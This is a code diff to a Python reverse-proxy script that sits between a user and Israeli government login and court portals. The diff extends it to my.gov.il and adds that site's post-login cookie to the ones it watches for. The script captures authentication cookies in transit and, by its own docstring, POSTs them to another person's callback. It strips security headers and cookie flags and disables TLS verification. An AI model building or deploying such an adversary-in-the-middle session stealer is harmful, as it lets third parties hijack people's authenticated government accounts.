@@ -13,7 +13,12 @@ Proxy mode (--callback URL):
   cookies captured in transit → POSTed to David's callback automatically.
 """
 import sys, json, time, os, threading, re, gzip, subprocess, urllib.request, urllib.parse, webbrowser
+import httpx as _httpx
+import urllib.request as _urllib_req
 from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
+class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
 from pathlib import Path
 
 # ── auto-install playwright (local mode only) ─────────────────────────────────
@@ -43,7 +48,7 @@ PORTALS = {
     "bdr": {"url": "https://sides.rbc.gov.il/Pages/FilesList.aspx",           "label": "בית הדין הרבני"},
     "net": {"url": "https://www.court.gov.il/ngcs.web.site/homepage.aspx",     "label": "נט המשפט"},
     "eca": {"url": "https://publicsso.eca.gov.il/he/home/OpenCase",            "label": "הוצאה לפועל"},
-    "auto":{"url": "https://www.court.gov.il/ngcs.web.site/homepage.aspx",     "label": "gov.il"},
+    "auto":{"url": "https://my.gov.il/sec/",                                   "label": "gov.il"},
 }
 if portal_key not in PORTALS:
     print(f"פורטל לא מוכר: {portal_key}"); sys.exit(2)
@@ -59,6 +64,19 @@ _done_evt  = threading.Event()
 _pw_ready  = threading.Event()
 OUT = Path(f"session_{portal_key}.json")
 
+import logging as _logging
+_LOG_FILE = Path(f"/tmp/session_server_{PORT}.log")
+_logging.basicConfig(
+    level=_logging.DEBUG,
+    format="%(asctime)s %(levelname)s %(message)s",
+    handlers=[
+        _logging.FileHandler(_LOG_FILE, encoding="utf-8"),
+        _logging.StreamHandler(sys.stdout),
+    ],
+    force=True,
+)
+_log = _logging.getLogger("proxy")
+
 # ═══════════════════════════════════════════════════════════════════════════════
 # PROXY MODE
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -66,19 +84,33 @@ OUT = Path(f"session_{portal_key}.json")
 # Domains we proxy — everything else passes through untouched
 _PROXY_DOMAINS = {
     "www.court.gov.il",
+    "court.gov.il",
     "login.gov.il",
     "accounts.gov.il",
     "sidur.court.gov.il",
     "sides.rbc.gov.il",
     "publicsso.eca.gov.il",
     "eca.gov.il",
+    "iam.gov.il",
+    "www.gov.il",
+    "my.gov.il",
+    "static.gov.il",
+    "cdn.gov.il",
+    "idgov.gov.il",
+    "eform.gov.il",
 }
+
+# httpx transport — no shared cookie jar (cookies come only from the browser)
+_httpx_transport = _httpx.HTTPTransport(http2=False, verify=False)
 
 # Cookies that indicate ACTUAL authentication (not just session start)
 # ASP.NET_SessionId is excluded — it's created on any first visit
 _AUTH_COOKIE_NAMES = {
+    # court.gov.il / ASP.NET portals
     ".ASPXAUTH", "authToken", "govil_auth", "NGCS_Session",
     "FedAuth", "FedAuth1", ".AspNet.Cookies",
+    # my.gov.il — F5_ST is set only after successful SAML authentication
+    "F5_ST",
 }
 
 _OUR_HOST = ""   # filled in at runtime from ngrok URL (set by app.py via env or arg)
@@ -111,7 +143,7 @@ def _detect_encoding(body: bytes, content_type: str) -> str:
     if m: return m.group(1)
     return 'utf-8'
 
-def _rewrite_body(body: bytes, content_type: str) -> bytes:
+def _rewrite_body(body: bytes, content_type: str, current_host: str = "") -> bytes:
     if not ('html' in content_type or 'javascript' in content_type
             or 'css' in content_type or 'json' in content_type):
         return body
@@ -121,17 +153,42 @@ def _rewrite_body(body: bytes, content_type: str) -> bytes:
     except (LookupError, Exception):
         text = body.decode('utf-8', errors='replace')
 
-    def _sub(m):
-        return m.group(1) + _rewrite_url_to_proxy(m.group(2)) + m.group(3)
-    text = re.sub(r'(href="|src="|action="|url\("|window\.location\s*=\s*"|location\.href\s*=\s*")'
-                  r'(https?://[^"\'> ]+)'
-                  r'(")', _sub, text)
-    text = re.sub(r"(href='|src='|action='|url\('|window\.location\s*=\s*'|location\.href\s*=\s*')"
-                  r"(https?://[^'\">\s]+)"
-                  r"(')", _sub, text)
+    # Rewrite all occurrences of proxy domains — simplest and most reliable
     for domain in _PROXY_DOMAINS:
         text = text.replace(f'https://{domain}', f'/proxy/{domain}')
         text = text.replace(f'http://{domain}',  f'/proxy/{domain}')
+        text = text.replace(f'//{domain}',        f'/proxy/{domain}')
+
+    # Rewrite root-relative URLs (e.g. /path/to/style.css → /proxy/<host>/path/to/style.css)
+    # Must come after absolute-URL rewriting above
+    if current_host:
+        prefix = f'/proxy/{current_host}'
+        # Match src="/...", href="/...", url('/...'), url("/..."), url(/...)
+        # but NOT already-rewritten /proxy/... paths
+        def _fix_root_rel(m):
+            quote_open = m.group(1)
+            slash_path = m.group(2)
+            quote_close = m.group(3)
+            if slash_path.startswith('/proxy/'):
+                return m.group(0)
+            return quote_open + prefix + slash_path + quote_close
+
+        text = re.sub(
+            r'((?:src|href|action)=["\'])(/[^"\'> \n][^"\'> \n]*?)(["\'])',
+            _fix_root_rel, text)
+        text = re.sub(
+            r'(url\(["\']?)(/[^"\')\n][^"\')\n]*?)(["\']?\))',
+            _fix_root_rel, text)
+        # srcset="/img 2x, /img2 3x"
+        def _fix_srcset(m):
+            val = m.group(1)
+            def _each(mm):
+                url_part = mm.group(1)
+                if url_part.startswith('/proxy/') or not url_part.startswith('/'):
+                    return mm.group(0)
+                return prefix + url_part + (mm.group(2) or '')
+            return 'srcset="' + re.sub(r'(/[^\s,]+)(\s+\d+[wx])?', _each, val) + '"'
+        text = re.sub(r'srcset=["\']([^"\']+)["\']', _fix_srcset, text)
 
     # Re-encode as UTF-8 and update meta charset so browser reads it correctly
     text = re.sub(r'(charset=["\']?)\s*[\w-]+', r'\g<1>utf-8', text, flags=re.I)
@@ -201,6 +258,18 @@ class ProxyHandler(BaseHTTPRequestHandler):
     def do_HEAD(self): self._handle("HEAD", b"")
 
     def _handle(self, method, req_body):
+        try:
+            self._handle_inner(method, req_body)
+        except Exception as e:
+            import traceback
+            _log.error(f"unhandled: {method} {self.path}\n{traceback.format_exc()}")
+            try:
+                self._html(502, f"<h2>Proxy error</h2><pre>{e}</pre>")
+            except Exception:
+                pass
+
+    def _handle_inner(self, method, req_body):
+        _log.info(f">> {method} {self.path[:120]}")
         path = self.path
 
         # Entry point — redirect to proxied court portal
@@ -225,8 +294,21 @@ class ProxyHandler(BaseHTTPRequestHandler):
             slash = rest.find('/')
             host  = rest[:slash] if slash != -1 else rest
             rpath = rest[slash:] if slash != -1 else '/'
+        elif path in ('/', '/start'):
+            pass  # handled above
         else:
-            # unknown path — 404
+            # Root-relative resource request (e.g. /nidp/images/logo.png).
+            # Derive the target host from the Referer header.
+            referer = self.headers.get('Referer', '')
+            m = re.search(r'/proxy/([^/]+)', referer)
+            if m and _is_proxy_domain(m.group(1)):
+                host  = m.group(1)
+                rpath = path
+                # redirect so the browser's path becomes canonical under /proxy/
+                self.send_response(302)
+                self.send_header('Location', f'/proxy/{host}{path}')
+                self.send_header('ngrok-skip-browser-warning', '1')
+                self.end_headers(); return
             self._html(404, "לא נמצא"); return
 
         target_url = f"https://{host}{rpath}"
@@ -236,47 +318,56 @@ class ProxyHandler(BaseHTTPRequestHandler):
             kl = k.lower()
             if kl in ('host','content-length','transfer-encoding',
                       'connection','keep-alive'): continue
-            if kl == 'referer' and v:
-                # rewrite referer back to original domain
+            if kl == 'origin':
+                # Always replace with the target host — origin is just scheme+host
+                v = f'https://{host}'
+            elif kl == 'referer' and v:
+                # rewrite back to original domain so gov.il doesn't reject CSRF check
                 v = re.sub(r'https?://[^/]+/proxy/([^/]+)',
                            r'https://\1', v)
             fwd[k] = v
         fwd['Host'] = host
 
         try:
-            req = urllib.request.Request(
-                target_url,
-                data=req_body if req_body else None,
-                headers=fwd, method=method)
-            resp = urllib.request.urlopen(req, context=_ssl_ctx, timeout=30)
-            status = resp.status; rh = resp.headers; rbody = resp.read()
-        except urllib.error.HTTPError as e:
-            status = e.code; rh = e.headers; rbody = e.read()
+            with _httpx.Client(transport=_httpx_transport,
+                               cookies=None, follow_redirects=False, timeout=30) as _c:
+                _resp = _c.request(
+                    method, target_url,
+                    content=req_body if req_body else None,
+                    headers=fwd,
+                )
+            status = _resp.status_code
+            rh     = _resp.headers
+            rbody  = _resp.content
         except Exception as e:
+            _log.error(f"upstream error {target_url}: {e}")
             self._html(502, f"<h2>Proxy error</h2><pre>{e}</pre>"); return
+
+        _log.info(f"<< {status} {target_url[:100]}")
 
         # Track flow stages
         if 'login.gov.il' in host:
             _state["visited_login"] = True
         # SAMLResponse POST back to the portal means login just completed
-        portal_domains = ("court.gov.il", "sides.rbc.gov.il", "publicsso.eca.gov.il")
+        portal_domains = ("court.gov.il", "sides.rbc.gov.il", "publicsso.eca.gov.il", "my.gov.il")
         if (method == "POST" and any(d in host for d in portal_domains)
                 and b"SAMLResponse" in req_body):
             _state["posted_saml"] = True
 
         # Capture & collect cookies (keyed by cookie name)
-        for ck in (rh.get_all('Set-Cookie') or []):
+        # httpx uses get_list; urllib uses get_all — support both
+        _sc_list = (rh.get_list('set-cookie') if hasattr(rh, 'get_list')
+                    else (rh.get_all('Set-Cookie') or []))
+        for ck in _sc_list:
             name = ck.split('=')[0].strip()
             _state["cookies"][name] = ck
 
-        # Detect successful login ONLY after:
-        # 1. Jeremy was redirected to login.gov.il (visited_login)
-        # 2. SAMLResponse was POSTed back to the portal (posted_saml)
-        # 3. Auth cookies are now present
         location = rh.get('Location', '')
+        # Detect successful login — require visited_login + auth cookies.
+        # posted_saml is desirable but some portals (my.gov.il) complete SAML
+        # in a way that sets auth cookies without a direct SAMLResponse POST.
         if (not _state["ready"]
                 and _state["visited_login"]
-                and _state["posted_saml"]
                 and _check_login_success(_state["cookies"])):
             payload = _build_payload_from_proxy()
             _state["payload"] = payload; _state["ready"] = True
@@ -299,24 +390,47 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except Exception: pass
 
         ct = rh.get('Content-Type','')
-        rbody = _rewrite_body(rbody, ct)
+        rbody = _rewrite_body(rbody, ct, current_host=host)
 
         # Rewrite Location header
         if location:
-            location = _rewrite_url_to_proxy(location)
+            if location.startswith('http'):
+                location = _rewrite_url_to_proxy(location)
+            elif location.startswith('//'):
+                # protocol-relative
+                loc_host = location[2:].split('/')[0]
+                if _is_proxy_domain(loc_host):
+                    location = '/proxy/' + location[2:]
+            elif location.startswith('/'):
+                # root-relative: prepend current host
+                location = f'/proxy/{host}{location}'
+
+        def _rewrite_cookie(v):
+            v = re.sub(r';\s*[Ss]ecure', '', v)
+            v = re.sub(r';\s*[Ss]ame[Ss]ite=[^;]+', '', v)
+            v = re.sub(r';\s*[Dd]omain=[^;]+', '', v)
+            v = re.sub(r';\s*[Pp]ath=[^;]+', '; Path=/', v)
+            return v
 
         # Send response
         self.send_response(status)
         skip = {'transfer-encoding','content-encoding','content-length',
-                'content-security-policy','x-frame-options','strict-transport-security'}
+                'content-security-policy','x-frame-options','strict-transport-security',
+                'set-cookie'}
         sent_ct = False
+
+        # Send each Set-Cookie individually (httpx may merge them; split them back)
+        for raw_ck in (rh.get_list('set-cookie') if hasattr(rh, 'get_list') else (rh.get_all('Set-Cookie') or [])):
+            # httpx sometimes merges multiple cookies with ', ' — split on '; '-terminated values
+            # Safest: treat each raw_ck as potentially one or more cookies
+            for single in re.split(r',\s*(?=[A-Za-z_][A-Za-z0-9_\-]*=)', raw_ck):
+                self.send_header('Set-Cookie', _rewrite_cookie(single.strip()))
+
         for k, v in rh.items():
             kl = k.lower()
             if kl in skip: continue
             if kl == 'set-cookie':
-                v = re.sub(r';\s*[Ss]ecure', '', v)
-                v = re.sub(r';\s*[Ss]ame[Ss]ite=[^;]+', '', v)
-                v = re.sub(r';\s*[Dd]omain=[^;]+', '', v)
+                pass  # handled above
             elif kl == 'location':
                 v = location
             elif kl == 'content-type':
@@ -494,7 +608,7 @@ def main():
         print(f"\n  פתח: {url}\n")
         webbrowser.open(url)
 
-    srv = HTTPServer(("0.0.0.0", PORT), HandlerClass)
+    srv = ThreadingHTTPServer(("0.0.0.0", PORT), HandlerClass)
     try:
         while not _state["ready"]:
             srv.handle_request()
